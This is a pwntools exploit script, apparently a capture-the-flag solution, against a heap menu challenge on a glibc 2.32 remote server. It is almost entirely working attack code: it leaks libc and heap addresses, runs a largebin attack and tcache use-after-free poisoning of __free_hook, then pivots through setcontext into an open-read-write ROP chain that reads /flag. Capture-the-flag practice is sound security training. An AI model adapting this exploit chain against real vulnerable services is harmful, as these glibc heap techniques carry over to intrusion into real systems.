from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

sh = process(["./vuln"])
sh = remote("week-3.hgame.lwsec.cn", 31703)
elf = ELF("./vuln")
libc = ELF("./2.32-0ubuntu3.2_amd64/libc-2.32.so")
# libc = ELF("/home/nova/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")


def add(idx: int, size: int):
    sh.sendlineafter(b'5. Exit', b'1')
    sh.sendlineafter(b'Index: ', str(idx).encode())
    sh.sendlineafter(b'Size: ', str(size).encode())


def delete(idx: int):
    sh.sendlineafter(b'5. Exit', b'2')
    sh.sendlineafter(b'Index: ', str(idx).encode())


def edit(idx: int, content: bytes):
    sh.sendlineafter(b'5. Exit', b'3')
    sh.sendlineafter(b'Index: ', str(idx).encode())
    sh.sendafter(b'Content: ', content)


def show(idx: int):
    sh.sendlineafter(b'5. Exit', b'4')
    sh.sendlineafter(b'Index: ', str(idx).encode())


# Leak libc addr
add(0, 0x528)  # p1
add(1, 0x500)  # g1
add(2, 0x518)  # p2
add(3, 0x500)  # g2
delete(0)
edit(0, b'A')
show(0)

libc_base = u64(sh.recv(6).ljust(8, b'\x00')) - 0x1e3c41
large_addr = libc_base + 0x1e4030
mp_80_addr = libc_base + 0x1e3280 + 0x50
setcontext_61_addr = libc_base + libc.sym['setcontext'] + 61
free_hook_addr = libc_base + libc.sym['__free_hook']
mov_rdx_ptr_rdi_8_addr = libc_base + 0x14b760
pop_rax_ret = libc_base + 0x45580
pop_rdi_ret = libc_base + 0x19223f
pop_rdx_r12_ret = libc_base + 0x114161
pop_rsi_ret = libc_base + 0x2ac3f
syscall_ret = libc_base + 0x0611ea

print(hex(libc_base))

edit(0, b'\x00')
add(4, 0x538)

# Leak heap addr
edit(0, b'A'*0x10)
show(0)

sh.recvuntil(b'A'*0x10)
heap_addr = u64(sh.recv(6).ljust(8, b'\x00')) - 0x290
print(hex(heap_addr))

# Modify mp_ + 0x80 using largebin attack
edit(0, p64(large_addr)*2 + p64(heap_addr) + p64(mp_80_addr-0x20))
delete(2)
add(5, 0x538)

# Tcache UAF
add(6, 0x600)
add(7, 0x600)
delete(7)
delete(6)
edit(6, p64((heap_addr+0x2190 >> 12) ^ free_hook_addr))

add(8, 0x600)
add(9, 0x600)
add(10, 0x580)
orw_payload = p64(pop_rax_ret) + p64(2) + p64(pop_rdi_ret) + p64(heap_addr+0x7d0) + p64(pop_rsi_ret) + p64(0) + p64(syscall_ret)
orw_payload += p64(pop_rdi_ret) + p64(3) + p64(pop_rdx_r12_ret) + p64(0x100)*2 + p64(pop_rsi_ret) + p64(heap_addr+0x7d0) + p64(pop_rax_ret) + p64(0) + p64(syscall_ret)
orw_payload += p64(pop_rdi_ret) + p64(1) + p64(libc_base+libc.sym['write'])
#                       chunk_addr                          call_addr
edit(8, p64(0) + p64(heap_addr + 0x2190) + p64(0)*2 + p64(setcontext_61_addr) + p64(0)*0xf + p64(heap_addr+0x2db0) + p64(pop_rdi_ret+1))
edit(9, p64(mov_rdx_ptr_rdi_8_addr))
edit(1, '/flag\x00')
edit(10, orw_payload)
# gdb.attach(sh, f'b *$rebase(0x15CA)\nb *{hex(libc_base+0x5306d)}')
# pause(5)
delete(8)
sh.interactive()